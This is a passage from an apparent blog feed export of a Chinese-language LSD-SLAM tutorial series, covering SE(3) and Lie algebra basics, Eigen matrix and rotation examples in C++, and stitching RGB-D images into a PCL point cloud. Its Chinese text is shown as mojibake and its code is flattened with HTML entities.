æ‰€ä»¥ï¼ç¶œåˆä»¥ä¸Šæ‰€è¿°ï¼Œä½ æœƒçŸ¥é“åŸä¾† $G$ å°±æ˜¯ $SE(3)$ é€™ç¨®ç¾¤ï¼Œå¯ä»¥å°ä¸‰ç¶­ç©ºé–“ä¸­çš„é»åšæ—‹è½‰å’Œå¹³ç§»ã€‚ç„¶å¾Œï¼Œ$\xi$ æ˜¯ $\mathfrak{se}(3)$ ï¼Œå°±æ˜¯è¢«å®šç¾©åœ¨ $SE(3)$ å–®ä½çŸ©é™£ä½ç½®çš„ tangent spaceã€‚
ä½ å¯èƒ½æƒ³å•ï¼Œæˆ‘å€‘æ˜æ˜ç›´æ¥ä½¿ç”¨ transformï¼Œç„¶å¾Œæƒ³è¾¦æ³•è¨ˆç®—å‡º $E(\xi)$ å°±å¥½äº†ï¼Œä½•å¿…ç”¨åˆ°ä»€éº¼æç¾¤æˆ–æ˜¯æä»£æ•¸å‘¢ï¼Ÿ
å…¶å¯¦ï¼Œå•é¡Œå°±åœ¨æ–¼ï¼Œæˆ‘å€‘æƒ³è¦å„ªåŒ–çš„ transform æœ‰ 6 å€‹è®Šæ•¸ï¼Œä½ æƒ³è¦æœ‰æ•ˆç‡åœ°å„ªåŒ–æœ‰ 6 è‡ªç”±åº¦çš„æ±è¥¿ï¼Œå°±æœƒéœ€è¦ç®—å°æ•¸ï¼ˆä¹‹å¾Œæœƒå¼•å‡º Jacobian çŸ©é™£ï¼‰ï¼Œä¸”å› ç‚ºæˆ‘å€‘æƒ³è¦å„ªåŒ–çš„ç›®æ¨™é‚„å…·å‚™ä¸€äº›æ•¸å­¸ä¸Šçš„ç‰¹æ€§ï¼Œå¦‚æœèƒ½å°ä»–æŒæ¡å¾—æ›´å¥½ï¼Œæˆ‘å€‘å°±èƒ½æ›´æœ‰æ•ˆç‡åœ°è§£æ±ºæœ€ä½³åŒ–å•é¡Œã€‚
æˆ‘ç¾åœ¨çš„ç†è§£åªå¤ èªªå‡ºé€™æ¨£çš„è§£é‡‹ï¼Œä¸ééš¨è‘—ä¹‹å¾Œçš„ç³»åˆ—å¾€ä¸‹çœ‹ï¼Œæˆ‘å€‘æœƒæ›´èƒ½ç™¼æ˜å¼•é€²æä»£æ•¸çš„ç¾å¦™ä¹‹è™•ã€‚
å†è¨ª $\omega$æ‰€ä»¥ï¼Œåˆ°é€™é‚Šæˆ‘å€‘å¯ä»¥å° $\omega$ æ›´åŠ äº†è§£ï¼Œä»–å…¶å¯¦å°±åªæ˜¯ä¸€å€‹é‹ç®—ï¼Œå› ç‚º $\xi$ åƒ…åƒ…å®šç¾©äº†é€™å€‹ transformï¼Œä½†æ˜¯æ²’æœ‰å®šç¾©è©²æ€éº¼å°ä¸€å€‹é»æ“ä½œã€‚é€™ä¹Ÿæ˜¯ç‚ºä»€éº¼æˆ‘å€‘éœ€è¦ $\omega$ã€‚å‰é¢æéï¼Œ$\omega$ æ˜¯ä¸€ç¨® warpingï¼Œå°æ·±åº¦ç‚º $d$ çš„é» $p$ é€²è¡Œ $\xi$ çš„ transformã€‚ä¹‹æ‰€ä»¥è¦å®šç¾©æ·±åº¦ $d$ï¼Œæ˜¯å› ç‚º $p$ åªæ˜¯ä¸€å€‹äºŒç¶­å¹³é¢ä¸Šçš„ä¸€é»ï¼Œç•¶ç„¶åœ¨é€™ç¯‡è«–æ–‡ä¸­æŒ‡çš„å°±æ˜¯å½±åƒä¸Šçš„ä¸€å€‹ pixelã€‚ä½†æ˜¯ $\omega \in se(3)$ é¡¯ç„¶éœ€è¦å°ä¸‰ç¶­ç©ºé–“ä¸­çš„ä¸€é»æ“ä½œï¼Œæ‰€ä»¥éœ€è¦ $d$ çš„è³‡è¨Šã€‚
ç¸½çµé€™æ¬¡é–‹å§‹å¾ä¸€å€‹æ¯”è¼ƒ rough çš„æ¦‚å¿µï¼Œæ·±å…¥åˆ°ä¸€é»é»è«–æ–‡ä¸­çš„ç´°ç¯€äº†ã€‚æˆ‘å¸Œæœ›æŠŠé€™ç³»åˆ—å®šä½æˆçœŸæ­£äº†è§£è«–æ–‡çš„ä¸€å€‹ç³»åˆ—ï¼Œæ‰€ä»¥å°æ–¼æœ‰ç›¸é—œåŸºç¤çš„è®€è€…ä¾†èªªå¯èƒ½è¦ºå¾—éç¨‹å¯«å¾—å¤ªç°¡å–®ã€‚ä¸éï¼Œç¶²è·¯ä¸Šå¤ªå¤šå¯«å¾—ä¸æ¸…æ¥šçš„è³‡æºäº†ï¼Œå°åŸºç¤ä¸å¤ çš„äººå­¸èµ·ä¾†æ‡‰è©²é —ç—›è‹¦ï¼ˆåƒæˆ‘å°±æ˜¯ï¼‰ï¼Œæ‰€ä»¥é‚„æ˜¯å¸Œæœ›å¯ä»¥æä¾›ä¸€å€‹æ¯”è¼ƒå®Œæ•´çš„ç³»åˆ—ï¼Œä¹Ÿå˜—è©¦åœ¨è£¡é¢ä½¿ç”¨ spiral learning çš„æŠ€å·§ä¸æ–·é‡è¨ªæŸäº›è§€å¿µã€ä¸æ–·æ·±å…¥ã€‚
éš¨è‘—æˆ‘å€‘æ…¢æ…¢åœ°é€²å±•ï¼Œæˆ‘å€‘æº–å‚™å¯ä»¥æŠŠå„ªåŒ– $E(\xi)$ çš„å„é …ç´°ç¯€éƒ½å¥½å¥½åœ°ä¾†é€šé”ä¸€ä¸‹ï¼Œæˆ‘å€‘ä¸‹å›å†è¦‹ï¼
å»¶ä¼¸é–±è®€
LSD-SLAMæ·±å…¥å­¸ç¿’ï¼ˆ2ï¼‰-ç®—æ³•è§£æ
è¦–è¦º SLAM ä¸­çš„æ•¸å­¸åŸºç¤ ç¬¬ä¸€ç¯‡ 3D ç©ºé–“çš„ä½ç½®è¡¨ç¤º
lie group and computer vision : æç¾¤ã€æä»£æ•¸åœ¨è¨ˆç®—æ©Ÿè¦–è¦ºä¸­çš„æ‡‰ç”¨
Multiple View Geometry - Lecture 3 (Prof. Daniel Cremers)

é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººè·Ÿé›»è…¦è¦–è¦ºæœ‰å°‘è¨±ç ”ç©¶ï¼Œæœ€è¿‘åœ¨é›éŠè‡ªå·±çš„åŸ·è¡ŒåŠ›
]]></content>
      <tags>
        <tag>Robotics</tag>
        <tag>ROS</tag>
        <tag>SLAM</tag>
        <tag>LSD SLAM</tag>
      </tags>
  </entry>
  <entry>
    <title>æ·±å…¥å­¸ç¿’ LSD-SLAM - 4</title>
    <url>/2017/07/08/lsd-slam-4/</url>
    <content><![CDATA[å‰è¨€ä¸Šæ¬¡è¬›äº†ä¸€äº›åŸºæœ¬çš„ç†è«–ä»‹ç´¹ï¼Œä½†æˆ‘å€‘ç¾åœ¨æ˜¯å¸Œæœ›å­¸æœƒå¦‚ä½•å¯¦éš›å¯«ç¨‹å¼è®“æ©Ÿå™¨äººå‹•èµ·ä¾†ï¼Œåªæœ‰ç´”æ•¸å­¸çš„è§€å¿µè·Ÿæ©Ÿå™¨äººå¥½åƒæ²’ä»€éº¼é—œä¿‚ï¼Œæ‰€ä»¥é€™æ¬¡å¸Œæœ›å¯ä»¥é–‹å§‹éŠœæ¥åˆ°ä¸€å€‹å¸¸ç”¨çš„å·¥å…· - Eigenã€‚è®“å¤§å®¶æœ‰å‹•æ‰‹å¯¦ä½œã€é–‹å§‹ç©åˆ°æ±è¥¿çš„æ„Ÿè¦ºã€‚
ç‚ºä»€éº¼è¦æœƒ Eigenï¼Ÿé¦–å…ˆï¼ŒEigen æ˜¯ä¸€å€‹ C++ çš„ open source libraryï¼Œæä¾›äº†è¨±å¤šç·šæ€§ä»£æ•¸é‹ç®—ç›¸é—œçš„å‡½å¼ã€‚
ç„¶å¾Œï¼Œæˆ‘å€‘é€™ä¸€ç³»åˆ—æ˜¯è¦ä»‹ç´¹ LSD-SLAMï¼Œæ‰€ä»¥ç•¶ç„¶æ˜¯å› ç‚º LSD-SLAM ä¹Ÿä½¿ç”¨ Eigen é€™å€‹ library ä¾†è™•ç†ç·šæ€§ä»£æ•¸çš„é‹ç®—ï¼Œä½ å¯ä»¥åœ¨ lsd-slam çš„ repository è£¡æœå°‹ eigenï¼Œå°±æœƒçœ‹åˆ° ä»¥ä¸‹çš„çµæœã€‚
å¦å¤–ï¼Œé‚„æœ‰è¨±å¤šçš„å·¥å…·ï¼Œä¾‹å¦‚ g2oã€sophus ä¹Ÿéƒ½æœ‰ä½¿ç”¨ Eigenï¼Œæ‰€ä»¥äº†è§£é€™å€‹å·¥å…·ç®—æ˜¯æ»¿å¿…è¦çš„ã€‚
å®‰è£èˆ‡å°ç©ä¸€ä¸‹ Eigenå®‰è£æ»¿ç°¡å–®çš„ï¼Œç›´æ¥ç”¨ä¸‹é¢é€™å€‹æŒ‡ä»¤å°±å¥½:
sudo apt-get install libeigen3-dev

å®‰è£å®Œæˆä¹‹å¾Œï¼Œä½ æ‡‰è©²å¯ä»¥åœ¨ &#x2F;usr&#x2F;include&#x2F;eigen3 è£¡é¢æ‰¾åˆ°ç›¸é—œçš„æª”æ¡ˆï¼Œå¦‚æœä½ é€²å»çœ‹ä¸€ä¸‹ï¼Œå°±æœƒçœ‹åˆ°å¾ˆå¤šé…·ç‚«çš„åŠŸèƒ½:

æ¥ä¸‹ä¾†å°±è®“æˆ‘å€‘ä¾†å¯«ä¸€å€‹çŸ©é™£çš„å°ç¨‹å¼ï¼Œé¦–å…ˆå…ˆæ–°å¢ä¸€å€‹è³‡æ–™å¤¾ï¼Œé–‹å§‹å¯« codeï¼š
mkdir test_eigenvim eigenMatrix.cpp

#include &lt;iostream&gt;using namespace std;#include &lt;Eigen/Core&gt;int main( int argc, char** argv )&#123;    // Eigen ä¸­æ‰€æœ‰å‘é‡å’ŒçŸ©é™£éƒ½æ˜¯Eigen::Matrixã€‚å®ƒçš„å‰ä¸‰å€‹åƒæ•¸åˆ†åˆ¥æ˜¯ï¼šè³‡æ–™è¡Œæ…‹ï¼Œrow æ•¸ï¼Œcol æ•¸    // å®£å‘Šä¸€å€‹ 2x3 çš„ float çŸ©é™£    Eigen::Matrix&lt;float, 2, 3&gt; matrix_23;    // åˆå§‹åŒ– matrix çš„ element    matrix_23 &lt;&lt; 1, 2, 3, 4, 5, 6;    // è¼¸å‡º    cout &lt;&lt; matrix_23 &lt;&lt; endl;    // ç”¨ () ä¾†å­˜å– matrix ä¸­çš„ element    for (int i=0; i&lt;2; i++) &#123;        for (int j=0; j&lt;3; j++)            cout&lt;&lt;matrix_23(i,j)&lt;&lt;&quot;\t&quot;;        cout&lt;&lt;endl;    &#125;		return 0;&#125;

å¯«å®Œä¹‹å¾Œå‘¢ï¼Œé‚„éœ€è¦ç·¨è­¯ï¼Œé€™é‚Šä¹Ÿæ¨è–¦å¤§å®¶ä½¿ç”¨ cmakeï¼Œç•¢ç«Ÿ ROS package éƒ½ä½¿ç”¨ catkin_makeï¼Œè€Œ åº•å±¤å…¶å¯¦é‚„æ˜¯ cmakeï¼
vim CMakeLists.txt

è£¡é¢çš„å…§å®¹æ˜¯:
cmake_minimum_required( VERSION 2.8 )project( eigenMatrix )set( CMAKE_BUILD_TYPE &quot;Release&quot; )set( CMAKE_CXX_FLAGS &quot;-O3&quot; )# Include Eigen headersinclude_directories( &quot;/usr/include/eigen3&quot; )# in osx and brew install# include_directories( /usr/local/Cellar/eigen/3.3.3/include/eigen3 )add_executable( eigenMatrix eigenMatrix.cpp )

æ¥ä¸‹ä¾†ç·¨è­¯è·ŸåŸ·è¡Œåªéœ€è¦:
cmake .make./eigenMatrix

ä½ æ‡‰è©²å°±å¯ä»¥çœ‹åˆ°å¦‚ä¸‹çš„è¼¸å‡ºäº†:
ros@ros-K401UB:~/code/eigen$ ./eigenMatrix 1 2 34 5 61	2	3	4	5	6	

çœ¼å°–çš„ä½ æ‡‰è©²æœƒç™¼ç¾ï¼Œè³‡æ–™å¤¾è£¡é¢å¤šäº†å¥½å¤šç·¨è­¯éç¨‹ä¸­è‡ªå‹•ç”¢ç”Ÿçš„æ–‡ä»¶ï¼Œæœ‰é»äº‚ã€‚æ‰€ä»¥ï¼Œæˆ‘å€‘å¯ä»¥é–‹ä¸€å€‹ build è³‡æ–™å¤¾ï¼Œè®“é€™äº›ä¸­é–“ç”¢ç‰©éƒ½è¢«æ”¾åœ¨é€™å€‹è³‡æ–™å¤¾ï¼Œå¦‚æœä»Šå¤©æƒ³è¦ç æ‰ä¸­é–“ç”¢ç‰©ï¼Œç æ‰é€™å€‹è³‡æ–™å¤¾å°±å¥½äº†ï¼é€™ç¨®æ–¹æ³•æœƒè®“ç·¨è­¯éç¨‹è®Šæˆï¼š
mkdir buildcd build cmake ..make

ç›¸ä¿¡æœ‰è‡ªå·±ä½¿ç”¨é cmake çš„è®€è€…ï¼Œå°ä¸Šé¢çš„æ­¥é©Ÿä¸€å®šä¸é™Œç”Ÿï¼
è§£ç·šæ€§æ–¹ç¨‹çµ„ &amp; åº§æ¨™è½‰æ›ç·šæ€§ä»£æ•¸ä¹Ÿå¸¸å¸¸è¢«ç”¨ä¾†è§£ç·šæ€§æ–¹ç¨‹çµ„æˆ–æ˜¯ä¾†åšåº§æ¨™è½‰æ›ï¼Œå¦‚æœä½ æƒ³è¦è©¦è‘—è§£çœ‹çœ‹ï¼Œè«‹åƒè€ƒé€™ç¯‡ è§£ least square æ–¹æ³• è·Ÿ Space Transformã€‚
æˆ‘å€‘å†ä¾†å¯«ä¸€å€‹å°ç¨‹å¼ä¾†æ›´ç†Ÿæ‚‰ Eigenï¼š
#include &lt;iostream&gt;#include &lt;cmath&gt;using namespace std;#include &lt;Eigen/Core&gt;// Eigen/Geometry æä¾›äº†å„ç§æ—‹è½‰å’Œå¹³ç§»çš„åŠŸèƒ½#include &lt;Eigen/Geometry&gt;int main ( int argc, char** argv )&#123;    // 3D æ—‹è½‰çŸ©é™£ç›´æ¥ä½¿ç”¨ Matrix3d æˆ– Matrix3f    Eigen::Matrix3d rotation_matrix = Eigen::Matrix3d::Identity();    	// AngleAxis å°±æ˜¯æ—‹è½‰å‘é‡,	//æ²¿ Z è»¸è½‰ 45 åº¦    Eigen::AngleAxisd rotation_vector ( M_PI/4, Eigen::Vector3d( 0,0,1 ) );     cout .precision(3);	//ç”¨matrix()è½‰æˆçŸ©é™£è¼¸å‡º    cout &lt;&lt; &quot;rotation matrix =\n&quot; &lt;&lt; rotation_vector.matrix() &lt;&lt; &quot;\n&quot; &lt;&lt; endl;        	// æ¥è‘—æˆ‘å€‘ç”¢ç”Ÿå¤§å®¶ç†Ÿæ‚‰çš„æ—‹è½‰çŸ©é™£    rotation_matrix = rotation_vector.toRotationMatrix();    	// Eigen ä½¿ç”¨ typedef æä¾›äº†è¨±å¤šå®¹æ˜“ç†è§£çš„è³‡æ–™å‹æ…‹ï¼Œä½† Vector3d å…¶å¯¦åªæ˜¯ Eigen::Matrix&lt;double, 3, 3&gt;	Eigen::Vector3d v ( 1,0,0 );    	// ç”¨æ—‹è½‰å‘é‡ä¾†æ—‹è½‰	Eigen::Vector3d v_rotated = rotation_vector * v;    cout &lt;&lt; &quot;(1,0,0) after rotation = &quot; &lt;&lt; v_rotated.transpose() &lt;&lt; &quot;\n&quot; &lt;&lt; endl;    	// æˆ–è€…ç”¨æ—‹è½‰çŸ©é™£æ—‹è½‰    v_rotated = rotation_matrix * v;    cout &lt;&lt; &quot;(1,0,0) after rotation = &quot; &lt;&lt; v_rotated.transpose() &lt;&lt; &quot;\n&quot; &lt;&lt; endl;    // Euler angle: å¯ä»¥å¾æ—‹è½‰çŸ©é™£ç›´æ¥ç®—å‡º    Eigen::Vector3d euler_angles = rotation_matrix.eulerAngles ( 2,1,0 ); // roll pitch yaw    cout &lt;&lt; &quot;yaw pitch roll = &quot; &lt;&lt; euler_angles.transpose() &lt;&lt; &quot;\n&quot; &lt;&lt; endl;    // å››å…ƒæ•¸    // å¯ä»¥ç›´æ¥æŠŠç”¨ AngleAxis ä¾†åˆå§‹åŒ–    Eigen::Quaterniond q = Eigen::Quaterniond ( rotation_vector );    cout &lt;&lt; &quot;quaternion = \n&quot; &lt;&lt; q.coeffs() &lt;&lt; &quot;\n&quot; &lt;&lt; endl;   // é †åºæ˜¯(x,y,z,w)    // ä¹Ÿå¯ä»¥ç”¨æ—‹è½‰çŸ©é™£ä¾†åˆå§‹åŒ–    q = Eigen::Quaterniond ( rotation_matrix );    cout &lt;&lt; &quot;quaternion = \n&quot; &lt;&lt; q.coeffs() &lt;&lt; &quot;\n&quot; &lt;&lt; endl;    // ä½¿ç”¨å››å…ƒæ•¸ä¾†æ—‹è½‰å‘é‡(æ‡‰è©²è¦è·Ÿä¹‹å‰ç”¨æ—‹è½‰å‘é‡æˆ–æ—‹è½‰çŸ©é™£çš„çµæœä¸€æ¨£)    v_rotated = q*v;     cout &lt;&lt; &quot;(1,0,0) after rotation = &quot; &lt;&lt; v_rotated.transpose() &lt;&lt; &quot;\n&quot; &lt;&lt; endl;    return 0;&#125;

ä½ åŸ·è¡ŒæˆåŠŸä¹‹å¾Œæ‡‰è©²å¯ä»¥çœ‹åˆ°ä¸‹é¢çš„è¼¸å‡ºï¼š
rotation matrix =    0.707    -0.707         0    0.707     0.707         0        0         0         1(1,0,0) after rotation =    0.707    0.707        0(1,0,0) after rotation =    0.707    0.707        0yaw pitch roll = 0.785 -0  0quaternion = 000.3830.924quaternion = 000.3830.924(1,0,0) after rotation =    0.707    0.707        0

ç¸½çµé€™æ¬¡å¾ˆç°¡å–®åœ°è·Ÿå¤§å®¶ä»‹ç´¹äº† Eigen é€™å€‹ libraryï¼Œå¸Œæœ›å¯ä»¥è®“å¤§å®¶ä¹‹å¾Œçœ‹åˆ° Eigen é€™å€‹ library æœƒæ¯”è¼ƒæœ‰è¦ªåˆ‡è·Ÿç†Ÿæ‚‰çš„æ„Ÿè¦ºï¼Œæˆ‘å€‘ä¸‹å›å†è¦‹ï¼
å»¶ä¼¸é–±è®€
é«˜ç¿”å¤§ç¥æ›¸ä¸­ ch3 çš„ç¨‹å¼ç¢¼
Eigen çš„å®˜æ–¹ module åˆ—è¡¨ 
Eigen çš„å®˜æ–¹ Quick Referenceï¼ˆé¡ä¼¼ cheatsheetï¼‰

é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººè·Ÿé›»è…¦è¦–è¦ºæœ‰å°‘è¨±ç ”ç©¶ï¼Œæœ€è¿‘åœ¨é›éŠè‡ªå·±çš„åŸ·è¡ŒåŠ›
]]></content>
      <tags>
        <tag>Robotics</tag>
        <tag>ROS</tag>
        <tag>SLAM</tag>
        <tag>LSD SLAM</tag>
        <tag>Eigen</tag>
      </tags>
  </entry>
  <entry>
    <title>æ·±å…¥å­¸ç¿’ lsd-slam - 5</title>
    <url>/2017/08/05/lsd-slam-5/</url>
    <content><![CDATA[å‰è¨€ä¸Šæ¬¡è·Ÿå¤§å®¶ç°¡ä»‹äº† Eigen é€™å€‹å¯ä»¥ç”¨ä¾†åšç·šæ€§ä»£æ•¸é‹ç®—çš„ open source libraryï¼Œè®“å¤§å®¶æœ‰å‹•æ‰‹å¯¦ä½œã€é–‹å§‹ç©åˆ°æ±è¥¿çš„æ„Ÿè¦ºã€‚ä»Šå¤©è¦å»¶çºŒå‹•æ‰‹å¯¦ä½œçš„ç²¾ç¥ï¼Œè·Ÿå¤§å®¶ä»‹ç´¹ä¸€ä¸‹è©²æ€éº¼æŠŠå¹¾å¼µ RGB-D å½±åƒæ‹¼æ¥æˆ point cloudï¼Œæ¥ä¸‹ä¾†å°±è®“æˆ‘å€‘ä¸€èµ·ç©ç©å§ï¼
åƒè€ƒè³‡æ–™ä¾†æºé€™æ¬¡çš„ dataï¼ˆåŒ…å« RGB å½±åƒè·Ÿ Depth Mapï¼‰ ç­‰ç­‰éƒ½æ˜¯ä¾†è‡ªæ–¼ slambook çš„ ch5ï¼Œæœ‰é€™äº›è³‡æ–™çœŸçš„è¶…è®šçš„ï¼Œä¸ç„¶è‡ªå·±å…‰è¦ç”¢ç”Ÿé€™äº›è³‡æ–™å°±å¾—èŠ±ä¸€äº›æ™‚é–“ï¼Œé‚„è¦æœ‰ç¡¬é«”ï¼Œæ¯”è¼ƒé›£å¿«é€Ÿåœ°ä¸Šæ‰‹ã€‚
æ ¸å¿ƒæ¦‚å¿µæˆ‘å€‘æ“æœ‰çš„ data æ˜¯ RGB-D æ„Ÿæ¸¬å™¨åœ¨ 5 å€‹ä¸åŒçš„ pose åº•ä¸‹æ‹åˆ°çš„å½±åƒï¼Œåˆ©ç”¨ç›¸æ©Ÿçš„å…§éƒ¨åƒæ•¸å°‡ä¸€çµ„ RGB-D å½±åƒä¸­çš„åƒç´ å°æ‡‰å› 3D ç›¸æ©Ÿåº§æ¨™ç³»ä¸‹çš„ point cloudï¼Œç„¶å¾Œå†åˆ©ç”¨å„çµ„åœ–çš„ camera poseï¼Œå°‡å„çµ„ point cloud å°æ‡‰åˆ°åŒä¸€å€‹ä¸–ç•Œåº§æ¨™ç³»ä¸‹ï¼Œå°±èƒ½çµ„åˆå‡ºåœ°åœ–ã€‚
å…¶ä¸­ pose.txt å„²å­˜çš„æ ¼å¼æ˜¯å¹³ç§»å‘é‡åŠ ä¸Šæ—‹è½‰å››å…ƒæ•¸ï¼š
$[x, y, z, q_x, q_y, q_z, q_w]$
å¦‚æœä½ å°å…§éƒ¨åƒæ•¸å’Œå¤–éƒ¨åƒæ•¸çš„æ¦‚å¿µä¸ç†Ÿï¼Œç¶²è·¯ä¸Šæœ‰é —å¤šè³‡æºï¼Œå€‹äººè¦ºå¾—å»¶ä¼¸é–±è®€ 1 çš„è¬›è§£ç®—æ˜¯ååˆ†æ¸…æ¥šçš„ï¼Œæ¨è–¦å»çœ‹çœ‹ï¼
å¯¦ä½œåŸºæœ¬å‡½å¼åº«å®‰è£é¦–å…ˆè¦å®‰è£ OpenCV2ï¼Œå› ç‚ºå¾…æœƒå¯«ç¨‹å¼éœ€è¦è®€å–å½±åƒï¼Œå› ç‚º OpenCV ä¹Ÿæ˜¯ä¸€å€‹ cmake projectï¼Œæ­¥é©Ÿæ¯”è¼ƒè¤‡é›œä¸€äº›ï¼Œå¯ä»¥ç›´æ¥çœ‹çœ‹å®˜æ–¹å®‰è£é é¢ã€‚
ç„¶å¾Œæ˜¯å®‰è£ PCLï¼š
sudo add-apt-repository ppa:v-launchpad-jochen-sprickerhof-de/pclsudo apt-get updatesudo apt-get install libpcl-all

ç¨‹å¼ç¢¼æ¥ä¸‹ä¾†å°±æ˜¯ç¨‹å¼ç¢¼å•¦ï¼Œå…¶å¯¦ä½ å¯ä»¥å…ˆè·‘èµ·ä¾†å†æ…¢æ…¢ç†è§£ï¼š
#include &lt;iostream&gt;#include &lt;fstream&gt;using namespace std;#include &lt;opencv2/core/core.hpp&gt;#include &lt;opencv2/highgui/highgui.hpp&gt;#include &lt;Eigen/Geometry&gt; #include &lt;boost/format.hpp&gt;  // for formating strings#include &lt;pcl/point_types.h&gt; #include &lt;pcl/io/pcd_io.h&gt; #include &lt;pcl/visualization/pcl_visualizer.h&gt;int main( int argc, char** argv )&#123;    vector&lt;cv::Mat&gt; colorImgs, depthImgs;    // å½©è‰²å½±åƒå’Œæ·±åº¦å½±åƒ    vector&lt;Eigen::Isometry3d&gt; poses;         // ç›¸æ©Ÿ pose         ifstream fin(&quot;./pose.txt&quot;);    if (!fin)    &#123;        cerr &lt;&lt; &quot;å¿…é ˆåœ¨æœ‰pose.txtçš„ç›®éŒ„ä¸‹åŸ·è¡Œæ­¤ç¨‹å¼&quot; &lt;&lt; endl;        return 1;    &#125;        // è®€å–å½©è‰²å½±åƒã€æ·±åº¦å½±åƒä»¥åŠå°æ‡‰çš„ç›¸æ©Ÿ pose    for ( int i=0; i&lt;5; i++ )    &#123;        boost::format fmt( &quot;./%s/%d.%s&quot; );         colorImgs.push_back( cv::imread( (fmt%&quot;color&quot;%(i+1)%&quot;png&quot;).str() ));        depthImgs.push_back( cv::imread( (fmt%&quot;depth&quot;%(i+1)%&quot;pgm&quot;).str(), -1 ));                 double data[7] = &#123;0&#125;;        for ( auto&amp; d:data )            fin&gt;&gt;d;        Eigen::Quaterniond q( data[6], data[3], data[4], data[5] );        Eigen::Isometry3d T(q);        T.pretranslate( Eigen::Vector3d( data[0], data[1], data[2] ));        poses.push_back( T );    &#125;        // è¨ˆç®— point cloud ä¸¦æ¥èµ·ä¾†    // æŒ‡å®šç›¸æ©Ÿå…§éƒ¨åƒæ•¸    double cx = 325.5;    double cy = 253.5;    double fx = 518.0;    double fy = 519.0;    double depthScale = 1000.0;        cout &lt;&lt; &quot;æ­£åœ¨å°‡å½±åƒè½‰æ›ç‚º point cloud ...&quot; &lt;&lt; endl;        // å®šç¾© point cloud ä½¿ç”¨çš„æ ¼å¼ï¼šé€™é‚Šç”¨çš„æ˜¯XYZRGB    typedef pcl::PointXYZRGB PointT;     typedef pcl::PointCloud&lt;PointT&gt; PointCloud;        PointCloud::Ptr pointCloud( new PointCloud );     for ( int i=0; i&lt;5; i++ )    &#123;        cv::Mat color = colorImgs[i];         cv::Mat depth = depthImgs[i];        Eigen::Isometry3d T = poses[i];        for ( int v=0; v&lt;color.rows; v++ )            for ( int u=0; u&lt;color.cols; u++ )            &#123;                //ä½¿ç”¨å…§éƒ¨åƒæ•¸èˆ‡æ·±åº¦å€¼ç®—å‡ºç›¸æ©Ÿåº§æ¨™ç³»ä¸‹çš„ point cloud                unsigned int d = depth.ptr&lt;unsigned short&gt; ( v )[u]; // æ·±åº¦å€¼                if ( d==0 ) continue; // æ·±åº¦ç‚º0è¡¨ç¤ºæ²’æœ‰é‡åˆ°                Eigen::Vector3d point;                 point[2] = double(d)/depthScale;                 point[0] = (u-cx)*point[2]/fx;                point[1] = (v-cy)*point[2]/fy;                      //ç”¨å¤–éƒ¨åƒæ•¸è½‰æ›åˆ°ä¸–ç•Œåº§æ¨™ç³»åº•ä¸‹            	Eigen::Vector3d pointWorld = T*point;                PointT p ;                p.x = pointWorld[0];                p.y = pointWorld[1];                p.z = pointWorld[2];                p.b = color.data[ v*color.step+u*color.channels() ];                p.g = color.data[ v*color.step+u*color.channels()+1 ];                p.r = color.data[ v*color.step+u*color.channels()+2 ];                pointCloud-&gt;points.push_back( p );            &#125;    &#125;        //å„²å­˜ point cloud    pointCloud-&gt;is_dense = false;    cout &lt;&lt; &quot;There are total &quot; &lt;&lt; pointCloud-&gt;size() &lt;&lt; &quot; points in the map.pcd.&quot; &lt;&lt;endl;    pcl::io::savePCDFileBinary(&quot;map.pcd&quot;, *pointCloud );    return 0;&#125;

ç·¨è­¯èˆ‡åŸ·è¡Œæ¥ä¸‹ä¾†å°±æ˜¯ç·¨è­¯å•¦ï¼š
mkdir buildcd build cmake ..makemv joinMap ../cd ..

ç·¨è­¯å®Œå°±å¯ä»¥åŸ·è¡Œä¸¦è§€å¯Ÿç”¢ç”Ÿçš„ map.pcd æª”äº†ã€‚
./joinMappcd_viewer map.pcd

ä¸€é–‹å§‹é–‹å•Ÿ pcd_viewer ï¼Œæœƒçœ‹åˆ°æ‰€æœ‰çš„ pointcloudéƒ½æ˜¯åŒä¸€å€‹é¡è‰²çš„ï¼Œè¦æŒ‰ 5 æ‰èƒ½é€²å…¥ RGB çš„æ¨¡å¼ï¼Œå¦‚æœä½ æœ‰æ­£ç¢ºåŸ·è¡Œï¼Œæ‡‰è©²æœƒçœ‹åˆ°å¦‚ä¸‹é¢é€™å¼µåœ–çš„æ•ˆæœï¼š

ç¸½çµé€™æ¬¡å¾ˆç°¡å–®åœ°è·Ÿå¤§å®¶ä»‹ç´¹äº†è©²æ€éº¼ä½¿ç”¨ç›¸æ©Ÿçš„å…§éƒ¨åƒæ•¸å’Œå¤–éƒ¨åƒæ•¸ï¼Œæ¨å¾—æ¯å€‹ pixel åœ¨ä¸–ç•Œåº§æ¨™ç³»ä¸­çš„ä½ç½®ï¼Œé€²è€Œç”¢ç”Ÿå‡º pointcloudï¼Œå¤§å®¶åœ¨æœ‰ç©ºæ™‚ä¹Ÿä¸å¦¨æ€è€ƒä¸€ä¸‹ï¼Œæˆ‘å€‘æ˜¯æ€éº¼èªè­˜é€™å€‹ä¸‰ç¶­ä¸–ç•Œçš„ï¼Œç‚ºä½•æˆ‘å€‘ä¸éœ€è¦çŸ¥é“æ¯å€‹ pointcloud çš„ç¢ºåˆ‡ä½ç½®å°±å¯ä»¥åšå¥½ç”Ÿæ´»ä¸­çš„å„é …äº‹æƒ…å‘¢ï¼Ÿ
æˆ‘å€‘æ¯å¤©éƒ½åœ¨ä½¿ç”¨å¾ˆå¤šé«˜ç´šçš„æ¼”ç®—æ³•ã€å®Œæˆå¾ˆå¤šè¤‡é›œçš„äº‹æƒ…ï¼Œå¦‚æœèƒ½å°‡é€™äº›æ¼”ç®—æ³•å¯¦ä½œæ–¼æ©Ÿå™¨äººï¼Œé‚£å°±å¯ä»¥é€ å‡ºè¶…ç´šé«˜ç´šçš„æ©Ÿå™¨äººäº†ï¼Œä¸éé€™ä¸€é»ä¹Ÿä¸å®¹æ˜“å°±æ˜¯äº†ã€‚
å»¶ä¼¸é–±è®€
Pinhole Cameraï¼šç›¸æ©Ÿåº§æ¨™æˆåƒåŸç†

